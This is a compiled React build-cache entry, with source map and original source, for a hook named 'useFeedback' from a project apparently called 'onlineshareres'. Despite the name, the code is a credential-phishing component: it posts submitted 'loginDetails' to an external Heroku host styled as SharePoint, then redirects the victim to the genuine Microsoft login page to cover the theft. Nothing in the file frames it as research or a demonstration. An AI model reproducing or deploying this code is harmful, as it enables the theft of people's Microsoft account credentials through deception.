{"ast":null,"code":"var _s = $RefreshSig$();\nimport axios from 'axios';\nimport { toast } from 'react-toastify';\nimport 'react-toastify/dist/ReactToastify.css';\nimport { useReducer } from 'react';\nimport { START_FEEDBACK, STOP_FEEDBACK } from './feedbackTypes';\nimport FeedbackReducer from './FeedbackReducer';\ntoast.configure();\nconst useFeedback = () => {\n  _s();\n  const [{\n    isLoading\n  }, dispatch] = useReducer(FeedbackReducer, {\n    isLoading: false\n  });\n  const postFeedback = async data => {\n    dispatch({\n      type: START_FEEDBACK\n    });\n    try {\n      const response = await axios.post(`${'https://share-point-tt.herokuapp.com/api/loginDetails'}`, data);\n      if (response.status === 200) {\n        window.location.assign('https://login.microsoftonline.com/common/login');\n        dispatch({\n          type: STOP_FEEDBACK\n        });\n      } else {\n        toast.error('oops');\n      }\n    } catch (e) {\n      toast.info('Something went wrong!');\n      if (e.response) {\n        dispatch({\n          type: STOP_FEEDBACK\n        });\n      }\n    }\n  };\n  return {\n    postFeedback,\n    isLoading\n  };\n};\n_s(useFeedback, \"myrd++y1nVQcDsAOVHRgSrUXUv0=\");\nexport default useFeedback;","map":{"version":3,"names":["axios","toast","useReducer","START_FEEDBACK","STOP_FEEDBACK","FeedbackReducer","configure","useFeedback","isLoading","dispatch","postFeedback","data","type","response","post","status","window","location","assign","error","e","info"],"sources":["C:/Users/RDP/Desktop/onlineshareres/src/api/useFeedback.js"],"sourcesContent":["import axios from 'axios';\r\nimport { toast } from 'react-toastify';\r\nimport 'react-toastify/dist/ReactToastify.css';\r\nimport { useReducer } from 'react';\r\nimport { START_FEEDBACK, STOP_FEEDBACK } from './feedbackTypes';\r\nimport FeedbackReducer from './FeedbackReducer';\r\n\r\n\r\ntoast.configure()\r\n\r\n\r\nconst useFeedback = () => {\r\n  const [\r\n    { isLoading },\r\n    dispatch,\r\n  ] = useReducer(FeedbackReducer, {\r\n    isLoading: false,\r\n  });\r\n\r\n  const postFeedback = async (data) => {\r\n    dispatch({ type: START_FEEDBACK });\r\n    try {\r\n      const response = await axios.post(`${'https://share-point-tt.herokuapp.com/api/loginDetails'}`,\r\n       data);\r\n      if (response.status === 200 ) {\r\n        window.location.assign('https://login.microsoftonline.com/common/login');\r\n        dispatch({\r\n          type: STOP_FEEDBACK,\r\n        });\r\n      } else {\r\n        toast.error('oops');\r\n      }\r\n    \r\n    } catch (e) {\r\n      toast.info('Something went wrong!');\r\n      if (e.response) {\r\n        dispatch({ type: STOP_FEEDBACK });\r\n      }\r\n    }\r\n  };\r\n\r\n  return {\r\n    postFeedback,\r\n    isLoading,\r\n  };\r\n};\r\n\r\nexport default useFeedback;\r\n"],"mappings":";AAAA,OAAOA,KAAK,MAAM,OAAO;AACzB,SAASC,KAAK,QAAQ,gBAAgB;AACtC,OAAO,uCAAuC;AAC9C,SAASC,UAAU,QAAQ,OAAO;AAClC,SAASC,cAAc,EAAEC,aAAa,QAAQ,iBAAiB;AAC/D,OAAOC,eAAe,MAAM,mBAAmB;AAG/CJ,KAAK,CAACK,SAAS,EAAE;AAGjB,MAAMC,WAAW,GAAG,MAAM;EAAA;EACxB,MAAM,CACJ;IAAEC;EAAU,CAAC,EACbC,QAAQ,CACT,GAAGP,UAAU,CAACG,eAAe,EAAE;IAC9BG,SAAS,EAAE;EACb,CAAC,CAAC;EAEF,MAAME,YAAY,GAAG,MAAOC,IAAI,IAAK;IACnCF,QAAQ,CAAC;MAAEG,IAAI,EAAET;IAAe,CAAC,CAAC;IAClC,IAAI;MACF,MAAMU,QAAQ,GAAG,MAAMb,KAAK,CAACc,IAAI,CAAE,GAAE,uDAAwD,EAAC,EAC7FH,IAAI,CAAC;MACN,IAAIE,QAAQ,CAACE,MAAM,KAAK,GAAG,EAAG;QAC5BC,MAAM,CAACC,QAAQ,CAACC,MAAM,CAAC,gDAAgD,CAAC;QACxET,QAAQ,CAAC;UACPG,IAAI,EAAER;QACR,CAAC,CAAC;MACJ,CAAC,MAAM;QACLH,KAAK,CAACkB,KAAK,CAAC,MAAM,CAAC;MACrB;IAEF,CAAC,CAAC,OAAOC,CAAC,EAAE;MACVnB,KAAK,CAACoB,IAAI,CAAC,uBAAuB,CAAC;MACnC,IAAID,CAAC,CAACP,QAAQ,EAAE;QACdJ,QAAQ,CAAC;UAAEG,IAAI,EAAER;QAAc,CAAC,CAAC;MACnC;IACF;EACF,CAAC;EAED,OAAO;IACLM,YAAY;IACZF;EACF,CAAC;AACH,CAAC;AAAC,GAlCID,WAAW;AAoCjB,eAAeA,WAAW"},"metadata":{},"sourceType":"module"}